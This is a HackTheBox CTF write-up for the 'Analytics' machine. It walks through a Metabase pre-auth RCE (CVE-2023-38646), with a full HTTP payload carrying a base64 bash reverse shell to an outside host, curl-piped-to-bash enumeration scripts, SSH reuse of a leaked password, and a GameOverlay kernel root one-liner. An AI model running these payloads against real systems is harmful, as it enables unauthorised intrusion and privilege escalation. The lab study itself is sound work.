---
render_with_liquid: false
title: HackTheBox Writeup  Analytics
date: 2023-10-08 08:48:33 +1400
tags: [hackthebox, nmap, linux, feroxbuster, katana, metabase, cve-2023-38646, java, sqli, remote-code-execution, docker, discover-secrets, password-reuse, docker-escape, kernel-exploit, cve-2023-2640, cve-2023-32629]
---



Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ pt init '10.129.49.172 analytics analytical.htb data.analytical.htb'
+-----------+--------+---------------+---------------------+
|  PROFILE  | STATUS |      IP       |       DOMAIN        |
+-----------+--------+---------------+---------------------+
| analytics | on     | 10.129.49.172 | analytics           |
| analytics | on     | 10.129.49.172 | analytical.htb      |
| analytics | on     | 10.129.49.172 | data.analytical.htb |
+-----------+--------+---------------+---------------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sun Oct  8 08:48:32 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- analytics.htb
Increasing send delay for 10.129.49.172 from 0 to 5 due to 11 out of 21 dropped probes since last increase.
Nmap scan report for analytics.htb (10.129.49.172)
Host is up, received user-set (0.11s latency).
Scanned at 2023-10-08 08:48:33 CST for 427s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Oct  8 08:55:40 2023 -- 1 IP address (1 host up) scanned in 428.10 seconds
```


## 80 - HTTP : Static site for data analyst service


### Info

```ruby
http://analytical.htb/ [200 OK] Bootstrap[4.1.0], Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.49.172], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

![](/assets/obsidian/2bc12c59d0fe698e9671c2a7152f3e3b.png)


### Directory

```bash
feroxbuster -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html" -v -k -n -e -r -o ferox_80.txt -u http://analytical.htb/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cat ferox_80.txt|awk '$1 != 404 && $1 != 403'|grep -vE 'analytical.htb/images/|analytical.htb/css/'
200      GET      213l     1380w    11324c http://analytical.htb/js/jquery-3.0.0.min.js
200      GET      370l     1201w     9645c http://analytical.htb/js/custom.js
200      GET        5l     1287w    87088c http://analytical.htb/js/jquery.min.js
200      GET        6l      352w    19190c http://analytical.htb/js/popper.min.js
200      GET      364l     1136w    17169c http://analytical.htb/index.html
200      GET        5l      478w    45479c http://analytical.htb/js/jquery.mCustomScrollbar.concat.min.js
200      GET        7l      896w    70808c http://analytical.htb/js/bootstrap.bundle.min.js
200      GET    18950l    75725w   918708c http://analytical.htb/js/plugin.js
200      GET      364l     1136w    17169c http://analytical.htb/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://analytical.htb -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://analytical.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: data.analytical.htb Status: 200 [Size: 77858]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```


# User Flag
---

## Enumeration

Crawl the site

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ katana -fx -jc -d 5 -kf all -jsl -o katana.txt -silent -u 'http://analytical.htb/'
```

Gathered a vhost : `data.analytical.htb`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cat katana.txt|unfurl -u domains
analytical.htb
data.analytical.htb
```

### data.analytical.htb

The vhost seems to be a `node.js` web app

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cat katana.txt|grep 'data.analytical.htb'
```

![](/assets/obsidian/5027d05770821b9f5cfe5d06e2147dc6.png)

![](/assets/obsidian/6ba85083ee40ddfe1daca6dea048d229.png)


## Shell as metabase in docker container


### Pre-Auth RCE in Metabase (CVE-2023-38646)


#### Analyze exploit

Google : `metabase exploit`

> https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

How the team was able to find RCE: 

- Obtained the setup token from `/api/session/properties`
- Found an API endpoint that can be used with this token that validates DB connections
- Found a 0day SQL injection vulnerability in H2 db driver
- Found that we could use `zip:/app/metabase.jar!/sample-database.db` to prevent the corruption of any databases on disk

This is the request POC to get a reverse shell

> The payload needs to be encoded in base64 with no special characters like `=`, and escape spaces with brackets(`{}`) after `bash -c` for `getRuntime().exec`
{: .prompt-tip }

```http
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```


#### Exploit

There's a POC for lazy people

> https://github.com/securezeron/CVE-2023-38646

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics/exploit]
└─$ git clone https://github.com/securezeron/CVE-2023-38646

┌──(bravosec㉿fsociety)-[~/htb/Analytics/exploit]
└─$ cd CVE-2023-38646

┌──(bravosec㉿fsociety)-[~/…/Analytics/exploit/CVE-2023-38646]
└─$ python CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/ --lhost 10.10.14.7 --lport 1111
[DEBUG] Original rhost: http://data.analytical.htb/
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.14.7, lport: 1111
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjcvMTExMSAwPiYx
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjcvMTExMSAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjcvMTExMSAwPiYx}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics/exploit/CVE-2023-38646]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.7] from (UNKNOWN) [10.129.49.172] 38842
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
2e299cf65045:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
2e299cf65045:/$ cat ~/user.txt
cat ~/user.txt
cat: can't open '/home/metabase/user.txt': No such file or directory
```

> `python`, `python3`, `script` are not on the box, can't spawn tty shell


## From metabase in docker container to metalytics on host

### Enumeration

```bash
2e299cf65045:/$ cat /etc/passwd|grep sh$
cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/ash
metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash

2e299cf65045:/$ ls -la ~
ls -la ~
total 8
drwxr-sr-x    1 metabase metabase      4096 Aug 25 15:17 .
drwxr-xr-x    1 root     root          4096 Aug  3 12:16 ..
lrwxrwxrwx    1 metabase metabase         9 Aug  3 12:22 .ash_history -> /dev/null
lrwxrwxrwx    1 metabase metabase         9 Aug 25 15:17 .bash_history -> /dev/null
```

We are in docker based on the `.dockerenv` file at `/`

```bash
ls -latr /
total 92
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 var
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 srv
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 sbin
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 run
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 mnt
drwxr-xr-x    5 root     root          4096 Jun 14 15:03 media
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 lib
drwxr-xr-x    1 root     root          4096 Jun 15 05:12 opt
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 usr
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 bin
drwxr-xr-x    1 root     root          4096 Jun 29 20:40 app
drwxr-xr-x    1 root     root          4096 Aug  3 12:16 home
drwxrwxrwt    1 root     root          4096 Aug  3 12:16 tmp
drwxr-xr-x    1 metabase metabase      4096 Aug  3 12:17 metabase.db
drwx------    1 root     root          4096 Aug  3 12:26 root
drwxrwxrwx    1 root     root          4096 Aug  7 11:10 plugins
drwxr-xr-x    1 root     root          4096 Oct  8 00:45 etc
-rwxr-xr-x    1 root     root             0 Oct  8 00:45 .dockerenv
drwxr-xr-x    1 root     root          4096 Oct  8 00:45 ..
drwxr-xr-x    1 root     root          4096 Oct  8 00:45 .
dr-xr-xr-x   13 root     root             0 Oct  8 00:45 sys
dr-xr-xr-x  207 root     root             0 Oct  8 00:45 proc
drwxr-xr-x    5 root     root           340 Oct  8 00:45 dev
```

Checked inside the `metabase` db, nothing interesting

```bash
2e299cf65045:/$ cd metabase.db
cd metabase.db
2e299cf65045:/metabase.db$ ls -la
ls -la
total 2980
drwxr-xr-x    1 metabase metabase      4096 Aug  3 12:17 .
drwxr-xr-x    1 root     root          4096 Oct  8 00:45 ..
-rw-r--r--    1 metabase metabase   3031040 Oct  8 03:05 metabase.db.mv.db
-rw-r--r--    1 metabase metabase      6248 Aug  3 12:17 metabase.db.trace.db
```


### Docker escape via password reuse from environment variable

Since I'm unfamiliar with docker escape, I'll just run `deepce` and `linpeas`

```bash
2e299cf65045:/proc/sys/kernel$ curl 10.10.14.7/linpeas.sh|bash
2e299cf65045:/proc/sys/kernel$ curl 10.10.14.7/deepce.sh|bash
```

![](/assets/obsidian/609e0b58431021d934bf3d5bb85a7838.png)

![](/assets/obsidian/f3f70e16c027db62bbcb7c5b4553bb32.png)

Found 1 password and 2 protentional users from environment variables

![](/assets/obsidian/b768a4f19689b0b20ab237cfd8974dff.png)\

Check password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cssh metabase@analytical.htb 'An4lytics_ds20223#'
Warning: Permanently added 'analytical.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cssh root@analytical.htb 'An4lytics_ds20223#'
Warning: Permanently added 'analytical.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/Analytics]
└─$ cssh metalytics@analytical.htb 'An4lytics_ds20223#'
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ cat user.txt
b6b8c1d17e3deeb761923c27068c2394
```


# Root Flag
---

## From metalytics to root


### 0day Kernel Exploit (GameOverlay)

```bash
metalytics@analytics:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
metalytics:x:1000:1000:,,,:/home/metalytics:/bin/bash
```

I struggled a bit and did not find any ways to get root without the 0-day kernel exploit (By the time at 2023-07) : `GameOverlay Ubuntu Kernel Exploit LPE (0-day)`, it's a combination of **CVE-2023-2640** and **CVE-2023-32629** 

- Vulnerable Ubuntu kernel versions : `6.2.0`, `5.19.0`, `5.4.0`
- Invulnerable Ubuntu kernel versions : `5.15.0`

```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Google : `linux 6.2.0-25 lpe`

> https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability

Saw this one liner from **@0xsyr0**'s security handbook a while ago

> https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day

Modify a bit to let it auto cleanup

```bash
export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
```

```bash

# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)

# cat /root/root.txt
645d9a7d91244c7d8581b188e7f1fa70
```

# Additional
---
